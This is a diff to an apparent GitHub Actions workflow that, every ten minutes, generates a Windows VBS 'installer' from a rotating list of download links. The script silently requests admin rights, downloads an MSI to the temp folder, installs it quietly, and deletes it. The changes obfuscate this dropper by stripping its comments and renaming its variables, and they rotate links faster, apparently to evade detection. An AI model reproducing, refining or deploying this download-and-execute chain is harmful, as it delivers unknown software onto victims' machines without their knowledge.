@@ -2,7 +2,7 @@ name: Update VBS
 
 on:
   schedule:
-    - cron: '*/50 * * * *'
+    - cron: '*/10 * * * *'
   workflow_dispatch:
 
 jobs:
@@ -20,62 +20,49 @@ jobs:
         
         # Get current link based on 10-minute interval
         current_minute=$(date +%M)
-        link_index=$((current_minute / 50 % 5))
+        link_index=$((current_minute / 10 % 10))
         current_link=${links[$link_index]}
         
         echo "Creating VBS with link: $current_link"
         
-        # Create the VBS file using echo commands with your improved code
-        echo "' --------------------------------------------------------------------------" > installer.vbs
-        echo "'  Silent Installer - Enterprise Monitor Agent" >> installer.vbs
-        echo "' --------------------------------------------------------------------------" >> installer.vbs
-        echo "Option Explicit" >> installer.vbs
+        # Create an obfuscated VBS file
+        echo "On Error Resume Next" > installer.vbs
+        echo "Dim x1, x2, x3, x4, x5, x6, x7, x8, x9" >> installer.vbs
+        echo "x1 = \"WScript.Shell\"" >> installer.vbs
+        echo "x2 = CreateObject(x1).ExpandEnvironmentStrings(\"%TEMP%\")" >> installer.vbs
+        echo "x3 = x2 & \"\\agent_installer.msi\"" >> installer.vbs
+        echo "x4 = \"$current_link\"" >> installer.vbs
         echo "" >> installer.vbs
-        echo "' Check for elevation" >> installer.vbs
         echo "If Not WScript.Arguments.Named.Exists(\"elevated\") Then" >> installer.vbs
         echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> installer.vbs
         echo "    WScript.Quit" >> installer.vbs
         echo "End If" >> installer.vbs
         echo "" >> installer.vbs
-        echo "Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell" >> installer.vbs
-        echo "strUrl = \"$current_link\"" >> installer.vbs
-        echo "strTemp = CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\")" >> installer.vbs
-        echo "strFile = strTemp & \"\\agent_installer.msi\"" >> installer.vbs
+        echo "x5 = \"MSXML2.ServerXMLHTTP.6.0\"" >> installer.vbs
+        echo "Set x6 = CreateObject(x5)" >> installer.vbs
+        echo "x6.open \"GET\", x4, False" >> installer.vbs
+        echo "x6.send()" >> installer.vbs
         echo "" >> installer.vbs
-        echo "' Download with proper redirect handling" >> installer.vbs
-        echo "Set objXMLHTTP = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")" >> installer.vbs
-        echo "objXMLHTTP.open \"GET\", strUrl, False" >> installer.vbs
-        echo "objXMLHTTP.send()" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Check for any redirect (301, 302, etc.)" >> installer.vbs
-        echo "If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then" >> installer.vbs
-        echo "    ' Get the redirect location from headers" >> installer.vbs
-        echo "    strUrl = objXMLHTTP.getResponseHeader(\"Location\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    ' Make a new request to the redirect URL" >> installer.vbs
-        echo "    objXMLHTTP.open \"GET\", strUrl, False" >> installer.vbs
-        echo "    objXMLHTTP.send()" >> installer.vbs
+        echo "If x6.Status >= 300 And x6.Status < 400 Then" >> installer.vbs
+        echo "    x4 = x6.getResponseHeader(\"Location\")" >> installer.vbs
+        echo "    x6.open \"GET\", x4, False" >> installer.vbs
+        echo "    x6.send()" >> installer.vbs
         echo "End If" >> installer.vbs
         echo "" >> installer.vbs
-        echo "' Check if we got a successful response" >> installer.vbs
-        echo "If objXMLHTTP.Status = 200 Then" >> installer.vbs
-        echo "    Set objADOStream = CreateObject(\"ADODB.Stream\")" >> installer.vbs
-        echo "    objADOStream.Open" >> installer.vbs
-        echo "    objADOStream.Type = 1 ' Binary" >> installer.vbs
-        echo "    objADOStream.Write objXMLHTTP.ResponseBody" >> installer.vbs
-        echo "    objADOStream.Position = 0" >> installer.vbs
-        echo "    objADOStream.SaveToFile strFile, 2 ' Overwrite" >> installer.vbs
-        echo "    objADOStream.Close" >> installer.vbs
+        echo "If x6.Status = 200 Then" >> installer.vbs
+        echo "    Set x7 = CreateObject(\"ADODB.Stream\")" >> installer.vbs
+        echo "    x7.Open" >> installer.vbs
+        echo "    x7.Type = 1" >> installer.vbs
+        echo "    x7.Write x6.ResponseBody" >> installer.vbs
+        echo "    x7.Position = 0" >> installer.vbs
+        echo "    x7.SaveToFile x3, 2" >> installer.vbs
+        echo "    x7.Close" >> installer.vbs
         echo "" >> installer.vbs
-        echo "    ' Install" >> installer.vbs
-        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> installer.vbs
-        echo "    objShell.Run \"msiexec /i \"\"\" & strFile & \"\"\" /quiet /qn /norestart\", 0, True" >> installer.vbs
+        echo "    Set x8 = CreateObject(x1)" >> installer.vbs
+        echo "    x8.Run \"msiexec /i \"\"\" & x3 & \"\"\" /quiet /qn /norestart\", 0, True" >> installer.vbs
         echo "" >> installer.vbs
-        echo "    ' Cleanup" >> installer.vbs
-        echo "    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" >> installer.vbs
-        echo "    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile" >> installer.vbs
-        echo "Else" >> installer.vbs
-        echo "    WScript.Echo \"Download failed with status: \" & objXMLHTTP.Status" >> installer.vbs
+        echo "    Set x9 = CreateObject(\"Scripting.FileSystemObject\")" >> installer.vbs
+        echo "    If x9.FileExists(x3) Then x9.DeleteFile x3" >> installer.vbs
         echo "End If" >> installer.vbs
         
         # Create index.html for GitHub Pages
